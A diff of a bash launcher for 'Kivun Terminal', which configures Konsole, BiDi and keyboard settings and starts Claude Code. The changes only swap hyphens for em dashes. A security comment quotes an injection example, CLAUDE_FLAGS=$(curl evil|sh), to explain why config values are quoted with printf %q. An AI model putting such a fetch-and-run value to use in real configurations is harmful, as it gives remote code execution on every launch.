@@ -1,5 +1,5 @@
 #!/bin/bash
-# Kivun Terminal - Linux launcher
+# Kivun Terminal — Linux launcher
 # Reads ~/.config/kivun-terminal/config.txt, applies keyboard layout and
 # BiDi settings, then spawns Konsole with the KivunTerminal profile running
 # Claude Code in the chosen folder.
@@ -72,12 +72,12 @@ ensure_wrapper_installed() {
 
     chmod +x "$bin" 2>/dev/null || true
 
-    # npm install guard - same stamp pattern as the WSL launcher. Reinstall
+    # npm install guard — same stamp pattern as the WSL launcher. Reinstall
     # only if node_modules is missing or package.json is newer than the stamp.
     local stamp="$dst/node_modules/.kivun-install-stamp"
     if [ ! -f "$stamp" ] || [ "$dst/package.json" -nt "$stamp" ]; then
         if command -v npm >/dev/null 2>&1; then
-            log "Installing wrapper deps (one-time, ~5-15s) - npm install --production"
+            log "Installing wrapper deps (one-time, ~5-15s) — npm install --production"
             (cd "$dst" && npm install --production --no-audit --no-fund) >> "$LOG_FILE" 2>&1
             local rc=$?
             if [ $rc -ne 0 ]; then
@@ -151,7 +151,7 @@ fi
 
 USE_KIVUN_COLORS="ColorScheme=ColorSchemeNoam"
 if [ "$TERMINAL_COLOR" != "kivun" ]; then
-    USE_KIVUN_COLORS="# ColorScheme not set - using Konsole default"
+    USE_KIVUN_COLORS="# ColorScheme not set — using Konsole default"
 fi
 
 cat > "$KONSOLE_DIR/KivunTerminal.profile" <<PROF
@@ -181,7 +181,7 @@ BidiLineLTR=$BIDI_LINE_LTR
 PROF
 log "Konsole profile refreshed (BiDi=$BIDI_ENABLED)"
 
-# --- Keyboard layout toggle (X11 only - setxkbmap doesn't work on Wayland) ---
+# --- Keyboard layout toggle (X11 only — setxkbmap doesn't work on Wayland) ---
 if [ "$KEYBOARD_TOGGLE" = "true" ] && [ -n "${DISPLAY:-}" ] && command -v setxkbmap >/dev/null 2>&1; then
     case "$RESPONSE_LANGUAGE" in
         english)     KBD_PRIMARY="us" ;;
@@ -215,10 +215,10 @@ if [ "$KEYBOARD_TOGGLE" = "true" ] && [ -n "${DISPLAY:-}" ] && command -v setxkb
 fi
 
 # --- Build language prompt for Claude ---
-# Shared map lives at ~/.local/share/kivun-terminal/languages.sh - one
+# Shared map lives at ~/.local/share/kivun-terminal/languages.sh — one
 # source of truth across Linux + macOS. If sourcing fails (deleted file,
 # older install), fall through with LANG_PROMPT="" and Claude runs in
-# English - no user-visible crash.
+# English — no user-visible crash.
 LANG_PROMPT=""
 LANG_MAP="$HOME/.local/share/kivun-terminal/languages.sh"
 if [ -f "$LANG_MAP" ]; then
@@ -250,7 +250,7 @@ KT_SETTINGS="$HOME/.local/share/kivun-terminal/settings.json"
 # the script body. Without this, a malicious config like
 #   CLAUDE_FLAGS=$(curl evil|sh)
 # would bake `$(curl evil|sh)` as literal text into the tmp script, then
-# bash would evaluate it when the script ran - full RCE on every launch.
+# bash would evaluate it when the script ran — full RCE on every launch.
 # With printf %q'd values in a sourced env file, CLAUDE_FLAGS becomes a
 # string value; bash's parameter expansion of a variable does NOT re-run
 # command substitution on that value.
@@ -266,7 +266,7 @@ chmod 600 "$ENV_FILE"
 cat > "$LAUNCH_TMP" <<'LAUNCHEOF'
 #!/bin/bash -l
 echo "==============================================="
-echo " Kivun Terminal - starting Claude Code"
+echo " Kivun Terminal — starting Claude Code"
 echo "==============================================="
 echo ""
 
@@ -284,7 +284,7 @@ fi
 
 # `command -v` resolves both PATH lookups (`claude`) and absolute paths
 # (the wrapper binary). For absolute paths, `command -v` succeeds only if
-# the file is executable - so handle that case explicitly to give a
+# the file is executable — so handle that case explicitly to give a
 # wrapper-specific error rather than the generic "install claude" message.
 case "$CLAUDE_EXEC" in
     /*)
@@ -324,7 +324,7 @@ echo ""
 # space in it) don't get word-split. $CLAUDE_FLAGS stays unquoted on the
 # command line for multi-flag strings like "--continue --verbose". Because
 # the variable was restored from a printf %q'd assignment, bash parameter
-# expansion produces its value as LITERAL TEXT - any $(...) or backticks
+# expansion produces its value as LITERAL TEXT — any $(...) or backticks
 # inside CLAUDE_FLAGS remain literal and are passed as-is to claude, not
 # re-evaluated by the shell.
 ARGS=()
